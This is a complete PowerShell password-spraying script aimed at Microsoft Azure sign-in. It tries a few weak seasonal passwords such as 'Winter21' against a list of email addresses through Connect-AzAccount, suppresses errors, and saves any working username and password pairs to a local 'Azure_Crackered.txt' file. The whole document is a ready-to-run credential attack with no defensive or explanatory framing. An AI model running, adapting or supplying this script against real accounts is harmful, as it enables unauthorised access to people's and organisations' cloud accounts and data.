$passwords = @(
"Winter21"
"Spring21"
"Welcome21"
)
#$passwords = Get-Content c:\temp\pwdList.txt 

$users = @(
"angelag@gmail.com"
"crock@yahoo.com"
"stevenk@gmail.com"
"clairec@ahhax.com"
)
#$users = Get-Content c:\temp\userList.txt


#Create new array object 
$potfile = New-Object System.Collections.ArrayList
$ErrorActionPreference = "SilentlyContinue"
foreach($p in $passwords){
    Write-Host "Starting with" $p "@" (Get-Date) -ForegroundColor Red
    foreach($u in $users){

        #Makes future changes and testing easier 
        $targetUser = $u

        if($potfile -match $targetUser){
            Write-Host "Already got password for" $targetUser -ForegroundColor Green
            ""
        }
        elseif($targetUser.Length -lt 5){
            Write-Host "Invalid user" $targetUser -ForegroundColor Yellow
        }
        else{
            Clear-Variable creds, check -ErrorAction SilentlyContinue
            $username = $targetUser
            $securePwd = ConvertTo-SecureString -AsPlainText $p -Force
            $creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$securePwd
            $check = Connect-AzAccount -Credential $creds -ErrorAction SilentlyContinue

            if($check){
                Write-Host "[+] Success!" -ForegroundColor Green
                Write-Host "User:" $targetUser
                Write-Host "Pwd: " $p 
                Write-Host "" 
                #Add result to array
                $potfile.Add($targetUser) > $null 
                "[+]Found: " + $targetUser + ":" + $p >> c:\temp\Azure_Crackered.txt 
            }
            else{
                Write-Host "[-] Invalid password!" -ForegroundColor Yellow
                Write-Host "User:" $targetUser
                Write-Host "Pwd: " $p
                Write-Host "" 
            }
            Disconnect-AzAccount
        }
    }
}
